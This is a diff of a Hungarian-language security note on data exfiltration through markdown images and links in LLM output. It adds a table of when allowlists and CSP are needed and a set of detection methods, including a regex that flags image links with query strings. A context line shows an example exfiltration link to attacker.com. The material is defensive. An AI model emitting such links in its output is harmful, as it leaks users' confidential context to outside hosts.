@@ -57,6 +57,22 @@ A „query-string" mező különösen veszélyes, mert URL-encoded szöveg, visz
 - **Markdown-link is exfiltrálhat**: `[click](https://attacker.com/log?data=...)` user-click-en küldi az adatot. Image automatikus, link explicit click-need.
 - **CSP misconfiguration**: ha `img-src *`-ot írsz vissza (lazy fix), újra nyitva van. Audit `csp-evaluator.withgoogle.com`-tal.
 
+## Mikor használd / mikor NE
+
+| Use-case | Allowlist + CSP kötelező? | Miért |
+|---|---|---|
+| LLM-output → public chat UI (Claude.ai-szerű) | IGEN | User-confidential-context végpontja |
+| LLM-output → email-render | IGEN | Mail-client renderel képeket; outbound exfil |
+| LLM-output → RSS / static-blog | IGEN (CSP) | Downstream renderer-ek nem védenek |
+| LLM-output → kontrollált-MD-fájl, NEM render | NEM (default) | Tárolva, nem renderelve, nincs HTTP-request |
+| Agent-internal trace (developer-only) | NEM | Belső dev-tooling, audit szintje elég |
+
+## Detection — hogyan találd meg az exfil-kísérletet
+
+1. **Server-side log**: minden LLM-output → grep `\!\[.*\]\(https?://[^)]+\?` (regex: bármilyen képbe encoded query-string). Ha találat NEM-allowlist-domain-en → audit-alert.
+2. **CSP `report-uri`**: a böngészők CSP-violation report-ot küldenek az endpoint-ra. Ezt logoltassad és heti audit-ban nézd.
+3. **DNS-monitoring**: ha egy production-app hirtelen ismeretlen-domain-re küld HTTP-request-eket, network-szinten kiderül.
+
 ## Kapcsolódó
 
 - [[sv-08-notebooklm-cognitive-layer]] — eredeti forrás-pattern
